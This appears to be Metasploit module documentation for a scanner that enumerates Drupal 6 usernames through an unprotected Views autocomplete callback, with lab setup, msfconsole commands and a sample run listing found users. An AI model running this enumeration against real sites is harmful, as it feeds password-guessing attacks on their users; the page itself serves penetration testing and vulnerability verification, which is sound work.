## Vulnerable Application

This module exploits an information disclosure vulnerability in the
[Views](https://www.drupal.org/project/views) module for Drupal 6. When the Views module
version 6.x-2.11 or earlier is installed, the autocomplete callback for user fields is
accessible without proper authorization. The module brute-forces the first 10 usernames by
iterating through the letters `a` to `z`.

Drupal does not consider disclosure of usernames to be a security weakness on its own, but
enumerated usernames can be useful for password-guessing attacks.

### Setup

1. Install Drupal 6 with the Views module version 6.x-2.11 or earlier.
2. Create several user accounts so there is data to enumerate.
3. Ensure the Views module is enabled under **Administer > Site building > Modules**.

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/scanner/http/drupal_views_user_enum`
3. Do: `set RHOSTS [target IP]`
4. Do: `run`
5. You should see a list of discovered usernames printed to the console.

## Options

### TARGETURI

The base path to the Drupal installation. The default value is `/`. Change this if Drupal is
installed in a subdirectory, for example `/drupal/`.

## Scenarios

### Drupal 6.x with Views 6.x-2.11

```
msf > use auxiliary/scanner/http/drupal_views_user_enum
msf auxiliary(scanner/http/drupal_views_user_enum) > set RHOSTS 192.168.1.50
RHOSTS => 192.168.1.50
msf auxiliary(scanner/http/drupal_views_user_enum) > set TARGETURI /
TARGETURI => /
msf auxiliary(scanner/http/drupal_views_user_enum) > run

[*] Begin enumerating users at 192.168.1.50
[+] Found User: admin
[+] Found User: john
[+] Found User: testuser
[*] Done. 3 usernames found...
[*] Usernames stored in: /root/.msf4/loot/20250319120000_default_192.168.1.50_drupal_user_123456.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

